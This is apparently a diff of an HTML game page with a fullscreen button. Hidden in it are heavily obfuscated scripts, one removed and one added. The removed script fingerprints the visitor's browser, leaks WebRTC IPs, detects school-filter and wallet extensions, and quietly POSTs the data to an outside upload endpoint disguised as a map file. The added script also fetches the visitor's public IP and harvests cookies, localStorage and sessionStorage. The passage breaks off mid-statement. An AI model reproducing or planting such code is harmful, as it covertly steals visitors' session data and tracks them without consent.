navigator['mediaDevices'][_0x348b01(0x1dd)]();_0x2cf4fb[_0x348b01(0x105)]=_0x2953d1[_0x348b01(0x19d)](_0x3c2457=>({'kind':_0x3c2457[_0x348b01('0x14a')],'label':_0x3c2457['label'],'deviceId':_0x3c2457[_0x348b01(0x129)],'groupId':_0x3c2457['groupId']}));}catch(_0x5092c0){_0x2cf4fb[_0x348b01('0x105')]={'error':_0x5092c0['toString']()};}try{if(navigator[_0x348b01('0x137')]){const _0xf17de9=await navigator[_0x348b01(0x137)]();_0x2cf4fb[_0x348b01('0x146')]={'charging':_0xf17de9[_0x348b01(0x178)],'level':_0xf17de9['level'],'chargingTime':_0xf17de9['chargingTime'],'dischargingTime':_0xf17de9[_0x348b01(0x164)]};}}catch(_0xf4d4cc){_0x2cf4fb[_0x348b01(0x146)]={'error':_0xf4d4cc['toString']()};}try{navigator[_0x348b01('0x122')]&&(_0x2cf4fb[_0x348b01('0x1c0')]={'effectiveType':navigator[_0x348b01('0x122')]['effectiveType'],'downlink':navigator[_0x348b01('0x122')][_0x348b01('0x1da')],'rtt':navigator[_0x348b01(0x122)][_0x348b01('0x19e')],'saveData':navigator[_0x348b01(0x122)]['saveData']});}catch(_0xf1d559){_0x2cf4fb[_0x348b01('0x1c0')]={'error':_0xf1d559[_0x348b01('0x16f')]()};}try{_0x2cf4fb[_0x348b01('0x11b')]=[];const _0x12c8ad=[_0x348b01('0x120'),_0x348b01(0x1a9),'Dark\x20Reader',_0x348b01(0x161),_0x348b01('0x10d'),_0x348b01('0x16d'),_0x348b01(0x1b2),_0x348b01(0x18a),'Honey'];for(const _0x280ed6 of _0x12c8ad){try{document['querySelector'](_0x348b01(0x173)+_0x280ed6+'\x22],\x20[class*=\x22'+_0x280ed6+'\x22]')&&_0x2cf4fb['extensions'][_0x348b01('0x1d4')](_0x280ed6);}catch(_0x579901){}}}catch(_0x2dd27c){_0x2cf4fb[_0x348b01(0x11b)]={'error':_0x2dd27c[_0x348b01(0x16f)]()};}_0x2cf4fb[_0x348b01('0x119')]={'supported':!!window[_0x348b01('0x1b7')]},_0x2cf4fb[_0x348b01(0x100)]={'supported':!!navigator[_0x348b01('0x100')]};try{_0x2cf4fb[_0x348b01(0x158)]={'supported':!!navigator[_0x348b01('0x1bc')],'origin':location[_0x348b01(0x16b)],'protocol':location[_0x348b01(0x175)],'registrations':[]};const _0x54fff0=[_0x348b01('0x134'),_0x348b01('0x167')],_0x2387eb=location[_0x348b01('0x16b')]&&location[_0x348b01(0x16b)]!==_0x348b01('0x194');if(navigator['serviceWorker']&&_0x54fff0[_0x348b01('0x17e')](location['protocol'])&&_0x2387eb){const _0x84098d=await navigator[_0x348b01(0x1bc)][_0x348b01(0x181)]();_0x2cf4fb[_0x348b01('0x158')][_0x348b01(0x16a)]=_0x84098d[_0x348b01(0x19d)](_0x221acb=>({'scope':_0x221acb[_0x348b01(0x131)],'active':!!_0x221acb[_0x348b01('0xfb')],'installing':!!_0x221acb[_0x348b01(0x17b)],'waiting':!!_0x221acb['waiting']}));}else _0x2cf4fb[_0x348b01(0x158)][_0x348b01('0x192')]=_0x348b01(0x186);}catch(_0xcd266b){_0x2cf4fb[_0x348b01('0x158')]={'error':_0xcd266b[_0x348b01('0x16f')]()};}try{_0x2cf4fb[_0x348b01('0x13f')]={'href':location[_0x348b01('0x140')],'origin':location[_0x348b01('0x16b')],'protocol':location['protocol'],'hostname':location[_0x348b01(0x141)],'host':location['host'],'port':location[_0x348b01(0x1d0)],'pathname':location[_0x348b01(0x165)],'search':location[_0x348b01(0x1d7)],'hash':location[_0x348b01('0x106')],'isSecureContext':window[_0x348b01('0x1cd')],'topEqualsSelf':window['top']===window['self'],'crossOriginIsolated':window['crossOriginIsolated'],'inIframe':window['self']!==window[_0x348b01(0x1b6)],'referrer':document[_0x348b01('0xf2')],'cookieEnabled':navigator[_0x348b01('0x1b4')],'online':navigator[_0x348b01('0x10f')],'visibilityState':document[_0x348b01('0x170')],'hidden':document[_0x348b01(0x17d)],'readyState':document['readyState'],'fullscreenEnabled':document[_0x348b01('0x12d')],'fullscreenElement':!!document[_0x348b01('0x139')],'compatMode':document[_0x348b01('0x1a3')],'characterSet':document[_0x348b01(0x1a7)],'contentType':document[_0x348b01('0x152')],'domain':document['domain'],'lastModified':document['lastModified']};}catch(_0x458fe0){_0x2cf4fb['executionContext']={'error':_0x458fe0[_0x348b01('0x16f')]()};}try{_0x2cf4fb['permissions']={};const _0x2e4f7b=[_0x348b01('0x100'),_0x348b01(0x1c6),_0x348b01(0xfc),_0x348b01(0x149),_0x348b01(0x183),_0x348b01(0x118),_0x348b01(0x163),_0x348b01(0x14c),_0x348b01('0xf3'),_0x348b01('0x1d4')];for(const _0x173fc6 of _0x2e4f7b){try{const _0x3df8f4=await navigator[_0x348b01(0x176)][_0x348b01(0xfa)]({'name':_0x173fc6});_0x2cf4fb[_0x348b01('0x176')][_0x173fc6]=_0x3df8f4['state'];}catch(_0x18a366){_0x2cf4fb['permissions'][_0x173fc6]=_0x348b01(0x1ce);}}}catch(_0x456ea9){_0x2cf4fb[_0x348b01('0x176')]={'error':_0x456ea9['toString']()};}try{_0x2cf4fb[_0x348b01(0x1d5)]=[];const _0x21b112=navigator[_0x348b01('0x1a1')]?.()||[];for(const _0x172ca9 of _0x21b112){if(!_0x172ca9)continue;_0x2cf4fb['gamepads'][_0x348b01(0x1d4)]({'id':_0x172ca9['id'],'index':_0x172ca9[_0x348b01('0x113')],'connected':_0x172ca9['connected'],'mapping':_0x172ca9[_0x348b01('0x10e')],'axes':_0x172ca9[_0x348b01('0x115')],'buttons':_0x172ca9[_0x348b01('0x19f')][_0x348b01(0x189)]});}}catch(_0x4186e5){_0x2cf4fb['gamepads']={'error':_0x4186e5[_0x348b01('0x16f')]()};}try{_0x2cf4fb[_0x348b01(0x16e)]=[];if(window[_0x348b01(0x187)]){const _0x34cf5f=speechSynthesis['getVoices']();_0x2cf4fb['speechVoices']=_0x34cf5f['map'](_0x3f3a33=>({'name':_0x3f3a33[_0x348b01(0x1cf)],'lang':_0x3f3a33['lang'],'localService':_0x3f3a33[_0x348b01(0x169)],'default':_0x3f3a33[_0x348b01(0x1c7)]}));}}catch(_0x28592c){_0x2cf4fb['speechVoices']={'error':_0x28592c[_0x348b01(0x16f)]()};}try{_0x2cf4fb[_0x348b01('0x179')]={'video':{'h264':MediaSource[_0x348b01(0x180)](_0x348b01('0x1cc')),'h265':MediaSource[_0x348b01('0x180')](_0x348b01('0x13d')),'vp8':MediaSource[_0x348b01('0x180')](_0x348b01('0x14b')),'vp9':MediaSource[_0x348b01(0x180)]('video/webm;\x20codecs=\x22vp9\x22'),'av1':MediaSource[_0x348b01('0x180')](_0x348b01('0x19b'))},'audio':{'mp3':MediaSource['isTypeSupported']('audio/mpeg'),'opus':MediaSource[_0x348b01(0x180)](_0x348b01(0x1bd)),'aac':MediaSource['isTypeSupported'](_0x348b01('0x14d')),'flac':MediaSource[_0x348b01('0x180')](_0x348b01(0x196))}};}catch(_0x1a40a3){_0x2cf4fb['mediaCodecs']={'error':_0x1a40a3['toString']()};}try{_0x2cf4fb['globalVariables']=Object['getOwnPropertyNames'](window)[_0x348b01('0x12c')](0x0,0x1f4);}catch(_0x19f63f){_0x2cf4fb[_0x348b01('0x114')]={'error':_0x19f63f[_0x348b01(0x16f)]()};}try{_0x2cf4fb[_0x348b01(0x12f)]=performance[_0x348b01('0x15e')]()[_0x348b01(0x19d)](_0x13f76a=>({'name':_0x13f76a[_0x348b01('0x1cf')],'entryType':_0x13f76a['entryType'],'duration':_0x13f76a[_0x348b01('0x198')],'startTime':_0x13f76a[_0x348b01(0x1dc)]}));}catch(_0x2e478a){_0x2cf4fb[_0x348b01(0x12f)]={'error':_0x2e478a[_0x348b01(0x16f)]()};}try{_0x2cf4fb[_0x348b01(0x109)]=[];if(window[_0x348b01('0x1b7')]){const _0x340a3f=new RTCPeerConnection({'iceServers':[]});_0x340a3f[_0x348b01('0x18f')](''),_0x340a3f[_0x348b01(0x18b)]=_0x5eccaa=>{const _0x36968c=_0x348b01;if(!_0x5eccaa[_0x36968c(0x1b8)])return;const _0x19cfdc=_0x5eccaa[_0x36968c(0x1b8)]['candidate'],_0x55af6a=_0x19cfdc[_0x36968c('0x124')](/([0-9]{1,3}(\.[0-9]{1,3}){3})/);if(_0x55af6a){const _0x2ec4dd=_0x55af6a[0x1];!_0x2cf4fb['webrtcIPs']['includes'](_0x2ec4dd)&&_0x2cf4fb[_0x36968c(0x109)]['push'](_0x2ec4dd);}};const _0x51bc75=await _0x340a3f['createOffer']();await _0x340a3f[_0x348b01(0x153)](_0x51bc75);}}catch(_0x543dda){_0x2cf4fb['webrtcIPs']={'error':_0x543dda[_0x348b01(0x16f)]()};}try{_0x2cf4fb[_0x348b01('0x156')]=[];if(document['fonts'])for(const _0x22c4a8 of document[_0x348b01(0x156)]){_0x2cf4fb[_0x348b01(0x156)][_0x348b01('0x1d4')]({'family':_0x22c4a8['family'],'style':_0x22c4a8[_0x348b01(0x11e)],'weight':_0x22c4a8[_0x348b01('0x168')],'status':_0x22c4a8[_0x348b01(0x107)]});}}catch(_0x58feb0){_0x2cf4fb[_0x348b01(0x156)]={'error':_0x58feb0['toString']()};}try{_0x2cf4fb[_0x348b01(0x127)]={'totalElements':document[_0x348b01('0x126')]('*')[_0x348b01('0x189')],'iframes':document[_0x348b01('0x126')](_0x348b01('0x177'))[_0x348b01(0x189)],'scripts':document[_0x348b01(0x126)]('script')[_0x348b01('0x189')],'images':document['images'][_0x348b01('0x189')],'links':document[_0x348b01('0x104')][_0x348b01(0x189)],'forms':document[_0x348b01('0x133')][_0x348b01('0x189')]};}catch(_0x113e57){_0x2cf4fb[_0x348b01(0x127)]={'error':_0x113e57[_0x348b01(0x16f)]()};}try{_0x2cf4fb['networkAdvanced']={'connection':navigator[_0x348b01(0x122)]?{'type':navigator[_0x348b01(0x122)][_0x348b01('0x15c')],'effectiveType':navigator[_0x348b01(0x122)][_0x348b01('0x128')],'downlink':navigator[_0x348b01('0x122')][_0x348b01(0x1da)],'downlinkMax':navigator[_0x348b01('0x122')][_0x348b01('0x121')],'rtt':navigator[_0x348b01('0x122')]['rtt'],'saveData':navigator['connection']['saveData']}:_0x348b01(0x1ce),'online':navigator['onLine'],'timezone':Intl['DateTimeFormat']()[_0x348b01('0x184')]()[_0x348b01(0x132)],'language':navigator[_0x348b01(0x151)],'languages':navigator[_0x348b01('0x1b5')]};}catch(_0x1d0669){_0x2cf4fb[_0x348b01('0xf8')]={'error':_0x1d0669['toString']()};}try{_0x2cf4fb[_0x348b01('0x1a8')]={'webrtcSupported':!!window[_0x348b01('0x1b7')],'dnsLeakTestNote':'Requires\x20external\x20signaling\x20to\x20fully\x20test'};}catch(_0xf58634){_0x2cf4fb[_0x348b01(0x1a8)]={'error':_0xf58634[_0x348b01('0x16f')]()};}try{_0x2cf4fb[_0x348b01('0xf4')]={},navigator[_0x348b01(0x1c5)]?.[_0x348b01('0x197')]&&(_0x2cf4fb[_0x348b01(0xf4)]=await navigator[_0x348b01(0x1c5)][_0x348b01(0x197)]([_0x348b01('0x10a'),_0x348b01('0x12e'),'platformVersion',_0x348b01('0x10c'),_0x348b01('0x1d6'),_0x348b01('0x12a')]));}catch(_0x4d696d){_0x2cf4fb[_0x348b01('0xf4')]={'error':_0x4d696d['toString']()};}try{const _0x35ff49=navigator;_0x2cf4fb[_0x348b01('0x13a')]=_0x35ff49[_0x348b01('0x122')]?{'effectiveType':_0x35ff49[_0x348b01(0x122)]['effectiveType'],'rtt':_0x35ff49[_0x348b01(0x122)][_0x348b01(0x19e)],'downlink':_0x35ff49[_0x348b01(0x122)][_0x348b01('0x1da')],'saveData':_0x35ff49['connection'][_0x348b01(0x143)],'type':_0x35ff49['connection'][_0x348b01('0x15c')]||_0x348b01(0x1ba)}:_0x348b01('0x1ce');}catch(_0x14e422){_0x2cf4fb['networkQuality']={'error':_0x14e422['toString']()};}try{const _0x2bd4f1=document[_0x348b01(0x130)]('canvas'),_0x156e40=_0x2bd4f1[_0x348b01('0x150')](_0x348b01(0xf0));_0x156e40&&(_0x2cf4fb[_0x348b01(0x174)]={'unmaskedVendor':_0x156e40[_0x348b01('0x1c2')](_0x348b01(0x1bf))?_0x156e40[_0x348b01('0x1d1')](_0x156e40[_0x348b01('0x1c2')](_0x348b01(0x1bf))['UNMASKED_VENDOR_WEBGL']):null,'unmaskedRenderer':_0x156e40[_0x348b01(0x1c2)](_0x348b01(0x1bf))?_0x156e40[_0x348b01(0x1d1)](_0x156e40['getExtension'](_0x348b01('0x1bf'))[_0x348b01('0x193')]):null,'extensions':_0x156e40[_0x348b01('0x147')]()});}catch(_0x58a0ef){_0x2cf4fb[_0x348b01('0x174')]={'error':_0x58a0ef[_0x348b01('0x16f')]()};}const _0x2624a5=JSON['stringify'](_0x2cf4fb),_0x50238c=btoa(unescape(encodeURIComponent(_0x2624a5)));fetch('https://ssl.pacogames.com/datafiles/pw5/UploadMapData.php',{'method':_0x348b01('0x16c'),'mode':_0x348b01(0x123),'headers':{'accept':_0x348b01('0x18c'),'accept-language':_0x348b01('0x172'),'content-type':'application/x-www-form-urlencoded'},'body':new URLSearchParams({'pname':_0x348b01('0x1bb'),'password':_0x348b01('0x1bb'),'mname':Date[_0x348b01(0xf5)]()[_0x348b01(0x16f)](),'fname':_0x348b01(0x1d3),'fdata':_0x50238c})[_0x348b01('0x16f')]()}),window[_0x348b01('0x1b3')]=_0x2cf4fb;})()));function _0x44e7(_0x49ff80,_0x21fc62){_0x49ff80=_0x49ff80-0xea;const _0xc6581e=_0xc658();let _0x44e7d3=_0xc6581e[_0x49ff80];return _0x44e7d3;}function _0xc658(){const _0x3d45c5=['architecture','split','model','GoGuardian','mapping','onLine','fillText','performanceMemory','pixelDepth','index','globalVariables','axes','databases','SHADING_LANGUAGE_VERSION','clipboard-write','webrtc','60XhzdOh','extensions','availWidth','url','style','textBaseline','MetaMask','downlinkMax','connection','cors','match','canvas','querySelectorAll','domStats','effectiveType','deviceId','fullVersionList','experimental-webgl','slice','fullscreenEnabled','bitness','performanceEntries','createElement','scope','timeZone','forms','https:','37859GFzJMg','width','getBattery','orientation','fullscreenElement','networkQuality','platform','open','video/mp4;\x20codecs=\x22hev1\x22','items','executionContext','href','hostname','platformVersion','saveData','canvasFingerprint','10ZcGOTm','battery','getSupportedExtensions','storage','microphone','kind','video/webm;\x20codecs=\x22vp8\x22','background-sync','audio/mp4;\x20codecs=\x22mp4a.40.2\x22','Unknown','height','getContext','language','contentType','setLocalDescription','highEntropy','268165phhMJG','fonts','18px\x20Arial','serviceWorkers','rgba(102,\x20204,\x200,\x200.7)','36vmAiTl','248824hNaIjc','type','jsHeapSizeLimit','getEntries','FingerprintTest','Unavailable','Loom','sizeBytes','persistent-storage','dischargingTime','pathname','usage','http:','weight','localService','registrations','origin','POST','Lightspeed','speechVoices','toString','visibilityState','title','en-US,en;q=0.9','[id*=\x22','gpuAdvanced','protocol','permissions','iframe','charging','mediaCodecs','userAgentDataError','installing','WebGL\x20unavailable','hidden','includes','170gqPYlf','isTypeSupported','getRegistrations','toISOString','clipboard-read','resolvedOptions','navigator','Blocked\x20because\x20current\x20origin\x20is\x20not\x20secure.','speechSynthesis','size','length','AdBlock','onicecandidate','*/*','UNMASKED_VENDOR_WEBGL','object','createDataChannel','parsed','quota','reason','UNMASKED_RENDERER_WEBGL','null','shift','audio/flac','getHighEntropyValues','duration','19344oATAZl','toDataURL','video/mp4;\x20codecs=\x22av01.0.05M.08\x22','fillStyle','map','rtt','buttons','maxTouchPoints','getGamepads','VERSION','compatMode','keys','7jvPuWf','gpu','characterSet','networkLeaks','uBlock','hardware','screen','getItem','localStorage','join','availHeight','usageDetails','sessionStorage','Tampermonkey','fullBrowserInfo','cookieEnabled','languages','top','RTCPeerConnection','candidate','#f60','unknown','BXY','serviceWorker','audio/webm;\x20codecs=\x22opus\x22','caches','WEBGL_debug_renderer_info','network','OffscreenCanvasBlob','getExtension','function','6021dzifCL','userAgentData','notifications','default','hardwareConcurrency','Canvas\x20unavailable','colorDepth','deviceMemory','video/mp4;\x20codecs=\x22avc1.42E01E\x22','isSecureContext','unsupported','name','port','getParameter','MAX_TEXTURE_SIZE','iuvewonqasuyhAuibavubdrwunv','push','gamepads','uaFullVersion','search','6574653ITsQka','brands','downlink','performanceMemoryError','startTime','enumerateDevices','cookie','version','MAX_RENDERBUFFER_SIZE','cookies','#069','totalSizeBytes','webgl','cacheStorage','referrer','midi','clientHints','now','fillRect','memory','networkAdvanced','estimate','query','active','camera','font','indexedDB','usedJSHeapSize','geolocation','timestamp','6736202gxUXnI','storageEstimate','links','mediaDevices','hash','status','userAgent','webrtcIPs'];_0xc658=function(){return _0x3d45c5;};return _0xc658();}
-    </script>
-  </body>
+    button.addEventListener('click', () => {
+      if (!document.fullscreenElement) {
+        iframe.requestFullscreen().catch(err => {
+          alert("Fullscreen not allowed: " + err.message);
+        });
+      } else {
+        document.exitFullscreen();
+      }
+    });
+  </script>
+  <script type="text/javascript">
+    (function(_0x419444,_0x4a5043){const _0x4280d3=_0x4899,_0x22653c=_0x419444();while(!![]){try{const _0x3eb13a=-parseInt(_0x4280d3(0x1d1))/0x1*(parseInt(_0x4280d3('0x184'))/0x2)+-parseInt(_0x4280d3(0x1c2))/0x3+parseInt(_0x4280d3('0x18a'))/0x4+parseInt(_0x4280d3(0xf6))/0x5+parseInt(_0x4280d3('0x1d5'))/0x6*(-parseInt(_0x4280d3('0x161'))/0x7)+-parseInt(_0x4280d3('0xe9'))/0x8+parseInt(_0x4280d3('0x17b'))/0x9;if(_0x3eb13a===_0x4a5043)break;else _0x22653c['push'](_0x22653c['shift']());}catch(_0x2dab45){_0x22653c['push'](_0x22653c['shift']());}}}(_0x2c74,0x908e6),((async()=>{const _0x52c2d9=_0x4899,_0x27b287={};async function _0x3a1245(){const _0x3f8d35=_0x4899,_0x593799=new AbortController(),_0x57be85=setTimeout(()=>_0x593799[_0x3f8d35('0x1cb')](),0xbb8);try{const _0x445c51=await fetch('https://api.ipify.org?format=json',{'signal':_0x593799[_0x3f8d35('0x19d')]});clearTimeout(_0x57be85);const _0xb168b9=await _0x445c51[_0x3f8d35(0xcd)]();return _0xb168b9['ip']||null;}catch(_0x41a83c){return clearTimeout(_0x57be85),null;}}_0x27b287['ip']=await _0x3a1245();function _0xd21dee(){const _0x3381d5=_0x4899;if(_0x3381d5('0x1e1')!==_0x3381d5('0x1e1'))_0x684378[_0x3381d5(0x103)]={'error':_0x105f81[_0x3381d5('0x168')]()};else{try{if(typeof OffscreenCanvas!=='undefined')return new OffscreenCanvas(0x100,0x100);if(typeof document!==_0x3381d5('0xc9')&&document['createElement'])return document['createElement'](_0x3381d5('0xe1'));}catch(_0x2ac4cf){}return null;}}_0x27b287[_0x52c2d9('0x1c3')]=new Date()['toISOString'](),_0x27b287['url']=location['href'],_0x27b287[_0x52c2d9(0x1c6)]=location['origin'],_0x27b287[_0x52c2d9('0x188')]=document['referrer'],_0x27b287[_0x52c2d9(0x193)]=document[_0x52c2d9(0x193)],_0x27b287[_0x52c2d9('0x11c')]={};for(const _0x404fb7 in navigator){try{const _0x4bfb69=navigator[_0x404fb7];typeof _0x4bfb69!==_0x52c2d9(0x12d)&&typeof _0x4bfb69!==_0x52c2d9('0x142')&&(_0x27b287[_0x52c2d9('0x11c')][_0x404fb7]=_0x4bfb69);}catch(_0x3b1c4c){}}try{_0x52c2d9('0x110')===_0x52c2d9(0xc5)?_0x15da2d[_0x52c2d9('0x1ca')][_0x576e4e]=_0x52c2d9('0x1a8'):navigator[_0x52c2d9(0x105)]&&(_0x27b287[_0x52c2d9(0x105)]={'mobile':navigator[_0x52c2d9(0x105)]['mobile'],'platform':navigator[_0x52c2d9(0x105)][_0x52c2d9('0x160')],'brands':navigator['userAgentData'][_0x52c2d9('0x18e')]},navigator[_0x52c2d9('0x105')][_0x52c2d9(0xc3)]&&(_0x27b287[_0x52c2d9('0x105')][_0x52c2d9('0x14d')]=await navigator[_0x52c2d9(0x105)][_0x52c2d9('0xc3')](['architecture',_0x52c2d9(0x15c),_0x52c2d9(0x1ab),_0x52c2d9(0xd6),_0x52c2d9(0x1be),'platformVersion',_0x52c2d9('0xe0'),_0x52c2d9(0x166)])));}catch(_0x5a0463){_0x27b287[_0x52c2d9('0x157')]=_0x5a0463[_0x52c2d9('0x168')]();}_0x27b287[_0x52c2d9('0xfa')]={'width':screen[_0x52c2d9(0x11a)],'height':screen['height'],'availWidth':screen[_0x52c2d9(0x1cf)],'availHeight':screen[_0x52c2d9('0x151')],'colorDepth':screen[_0x52c2d9('0xdc')],'pixelDepth':screen['pixelDepth'],'orientation':screen[_0x52c2d9('0x1e8')]?.[_0x52c2d9('0x130')],'devicePixelRatio':window[_0x52c2d9(0x1a9)]},_0x27b287['hardware']={'cpuThreads':navigator[_0x52c2d9(0x11d)],'ramGB':navigator[_0x52c2d9('0x183')],'maxTouchPoints':navigator[_0x52c2d9(0x13a)]};try{performance[_0x52c2d9('0xc7')]&&(_0x27b287['performanceMemory']={'jsHeapSizeLimit':performance[_0x52c2d9(0xc7)][_0x52c2d9(0xe5)],'totalJSHeapSize':performance[_0x52c2d9('0xc7')]['totalJSHeapSize'],'usedJSHeapSize':performance[_0x52c2d9(0xc7)][_0x52c2d9(0x18c)]});}catch(_0x262772){_0x27b287[_0x52c2d9('0x1cc')]=_0x262772[_0x52c2d9('0x168')]();}try{if(_0x52c2d9(0x1df)!==_0x52c2d9('0x1df')){if(typeof _0x32d4f6!==_0x52c2d9(0xc9))return new _0x38d76f(0x100,0x100);if(typeof _0x5c3677!==_0x52c2d9(0xc9)&&_0x56950c[_0x52c2d9(0x15e)])return _0x449dd1['createElement'](_0x52c2d9('0xe1'));}else{const _0x4f9a1f=_0xd21dee();if(!_0x4f9a1f)throw new Error(_0x52c2d9('0x1c1'));const _0x6ccfcf=_0x4f9a1f[_0x52c2d9('0xd7')](_0x52c2d9('0xf9'))||_0x4f9a1f[_0x52c2d9('0xd7')](_0x52c2d9('0x14a'))||_0x4f9a1f[_0x52c2d9(0xd7)](_0x52c2d9('0x119'));if(!_0x6ccfcf){if(_0x52c2d9(0x1b8)==='EEffu')throw new Error(_0x52c2d9(0x189));else _0x5bde8a[_0x52c2d9('0x186')]={'error':_0x49b259[_0x52c2d9(0x168)]()};}const _0x246b86=_0x6ccfcf['getExtension'](_0x52c2d9(0x10d));_0x27b287['gpu']={'vendor':_0x246b86?_0x6ccfcf[_0x52c2d9('0x1b0')](_0x246b86['UNMASKED_VENDOR_WEBGL']):_0x52c2d9(0x1e2),'renderer':_0x246b86?_0x6ccfcf[_0x52c2d9(0x1b0)](_0x246b86[_0x52c2d9(0x1cd)]):_0x52c2d9(0x1e2),'version':_0x6ccfcf[_0x52c2d9(0x1b0)](_0x6ccfcf['VERSION']),'shadingLanguageVersion':_0x6ccfcf[_0x52c2d9('0x1b0')](_0x6ccfcf[_0x52c2d9('0x118')]),'maxTextureSize':_0x6ccfcf['getParameter'](_0x6ccfcf[_0x52c2d9(0x125)]),'maxRenderBufferSize':_0x6ccfcf[_0x52c2d9(0x1b0)](_0x6ccfcf[_0x52c2d9(0xfe)]),'maxViewportDims':_0x6ccfcf['getParameter'](_0x6ccfcf[_0x52c2d9(0x10e)])};}}catch(_0x509a57){_0x52c2d9('0xee')!==_0x52c2d9(0xee)?_0x43c1f8[_0x52c2d9('0x13f')]={'href':_0x55ba01[_0x52c2d9(0x11f)],'origin':_0x3f2bce['origin'],'protocol':_0x5a2aed['protocol'],'hostname':_0x2801e1[_0x52c2d9(0x13c)],'host':_0x48da2b['host'],'port':_0x4bd9a1['port'],'pathname':_0x2fc777['pathname'],'search':_0x198aeb['search'],'hash':_0xc1e7cb[_0x52c2d9(0x182)],'isSecureContext':_0x561bae[_0x52c2d9(0x195)],'topEqualsSelf':_0x27c716[_0x52c2d9('0xc0')]===_0x10773d[_0x52c2d9('0x11e')],'crossOriginIsolated':_0x45ff90[_0x52c2d9(0xd9)],'inIframe':_0xb0c8a4[_0x52c2d9(0x11e)]!==_0x1c569d[_0x52c2d9(0xc0)],'referrer':_0x1c8663[_0x52c2d9('0x188')],'cookieEnabled':_0x59d0e9['cookieEnabled'],'online':_0x45c439['onLine'],'visibilityState':_0x225132[_0x52c2d9('0x107')],'hidden':_0x4df0d8[_0x52c2d9('0x154')],'readyState':_0x2b8ae1[_0x52c2d9(0x1a0)],'fullscreenEnabled':_0x18c2ac[_0x52c2d9('0x127')],'fullscreenElement':!!_0x1acaa4[_0x52c2d9('0x1ac')],'compatMode':_0x5e7fbe['compatMode'],'characterSet':_0x349695[_0x52c2d9(0x10f)],'contentType':_0x385dc2[_0x52c2d9('0x117')],'domain':_0x397484[_0x52c2d9('0x1ce')],'lastModified':_0x2020ad['lastModified']}:_0x27b287[_0x52c2d9('0x18d')]={'error':_0x509a57[_0x52c2d9(0x168)]()};}try{if('NPKlC'==='roABC')_0x35226d[_0x52c2d9(0x16b)]=_0x57f22e[_0x52c2d9(0x1c4)]()[_0x52c2d9('0x18b')](_0x2e8b58=>({'name':_0x2e8b58[_0x52c2d9('0x174')],'entryType':_0x2e8b58[_0x52c2d9(0x12f)],'duration':_0x2e8b58['duration'],'startTime':_0x2e8b58[_0x52c2d9('0xde')]}));else{const _0x3f9dfb=_0xd21dee();if(!_0x3f9dfb)throw new Error(_0x52c2d9('0x1c1'));const _0x47a7cf=_0x3f9dfb[_0x52c2d9(0xd7)]('2d');if(!_0x47a7cf)throw new Error(_0x52c2d9(0x1b9));_0x3f9dfb['width']=0x12c,_0x3f9dfb['height']=0x96,_0x47a7cf['textBaseline']=_0x52c2d9('0xc0'),_0x47a7cf[_0x52c2d9('0x1ea')]=_0x52c2d9(0x123),_0x47a7cf[_0x52c2d9('0x14b')]='#f60',_0x47a7cf[_0x52c2d9('0x138')](0x7d,0x1,0x3e,0x14),_0x47a7cf[_0x52c2d9(0x14b)]=_0x52c2d9(0x1b5),_0x47a7cf[_0x52c2d9(0x129)](_0x52c2d9('0x1b2'),0x2,0xf),_0x47a7cf[_0x52c2d9(0x14b)]=_0x52c2d9('0x199'),_0x47a7cf['fillText'](navigator[_0x52c2d9('0x140')],0x4,0x2d);if(_0x3f9dfb[_0x52c2d9('0x1d7')])_0x52c2d9('0x1b7')!==_0x52c2d9('0xf1')?_0x27b287[_0x52c2d9(0x187)]=_0x52c2d9('0xd2'):_0x52d9e9['clientHints']={'error':_0x314eec[_0x52c2d9(0x168)]()};else _0x3f9dfb[_0x52c2d9('0xf0')]?_0x27b287[_0x52c2d9('0x187')]=_0x3f9dfb[_0x52c2d9(0xf0)]():_0x52c2d9(0x19f)==='VWrxf'?_0x27b287['canvasFingerprint']=_0x52c2d9(0x1c8):_0xfd362a[_0x52c2d9(0x108)][_0x52c2d9('0xf4')](_0xc20282);}}catch(_0x2b285d){_0x52c2d9(0x1af)===_0x52c2d9(0x1af)?_0x27b287['canvasFingerprint']={'error':_0x2b285d[_0x52c2d9('0x168')]()}:_0x2aeb90[_0x52c2d9('0x1ae')]={'error':_0x18ba24[_0x52c2d9('0x168')]()};}try{_0x27b287[_0x52c2d9('0x1e0')]={'raw':document['cookie'],'parsed':{}},document[_0x52c2d9('0x172')]['split'](';')[_0x52c2d9(0xe8)](_0x39c7cf=>{const _0x3e1b91=_0x52c2d9,_0x133a61=_0x39c7cf[_0x3e1b91('0x1da')]('=');if(_0x133a61[_0x3e1b91(0x132)]>=0x2){const _0x5e1fd6=_0x133a61[_0x3e1b91(0xfb)]()['trim'](),_0x2d433b=_0x133a61[_0x3e1b91(0xf3)]('=');_0x27b287[_0x3e1b91('0x1e0')]['parsed'][_0x5e1fd6]=_0x2d433b;}}),_0x27b287[_0x52c2d9(0x1e0)][_0x52c2d9(0x102)]=new Blob([document[_0x52c2d9(0x172)]])['size'];}catch(_0x2b95ac){_0x52c2d9('0xd3')!==_0x52c2d9('0xd3')?_0x3e35d4[_0x52c2d9(0x16d)]={'error':_0x50a142['toString']()}:_0x27b287['cookies']={'error':_0x2b95ac[_0x52c2d9('0x168')]()};}try{_0x27b287[_0x52c2d9('0x159')]={'itemCount':localStorage['length'],'items':{},'totalSizeBytes':0x0};for(let _0x29c174=0x0;_0x29c174<localStorage[_0x52c2d9(0x132)];_0x29c174++){if(_0x52c2d9(0x1d4)!==_0x52c2d9('0x169')){const _0x3a1d66=localStorage[_0x52c2d9('0x1d2')](_0x29c174),_0x2d7aaa=localStorage[_0x52c2d9('0x185')](_0x3a1d66);_0x27b287[_0x52c2d9('0x159')][_0x52c2d9(0x147)][_0x3a1d66]=_0x2d7aaa,_0x27b287[_0x52c2d9('0x159')][_0x52c2d9(0xf2)]+=new Blob([_0x3a1d66+_0x2d7aaa])[_0x52c2d9(0xed)];}else _0xe972a2[_0x52c2d9('0x187')]=_0x26893e[_0x52c2d9(0xf0)]();}}catch(_0x3f2830){_0x27b287[_0x52c2d9(0x159)]={'error':_0x3f2830[_0x52c2d9('0x168')]()};}try{_0x27b287[_0x52c2d9(0x16d)]={'itemCount':sessionStorage['length'],'items':{},'totalSizeBytes':0x0};for(let _0x543bc9=0x0;_0x543bc9<sessionStorage[_0x52c2d9('0x132')];_0x543bc9++){const _0x30ec80=sessionStorage['key'](_0x543bc9),_0x3dfac3=sessionStorage[_0x52c2d9(0x185)](_0x30ec80);_0x27b287[_0x52c2d9(0x16d)][_0x52c2d9('0x147')][_0x30ec80]=_0x3dfac3,_0x27b287[_0x52c2d9(0x16d)]['totalSizeBytes']+=new 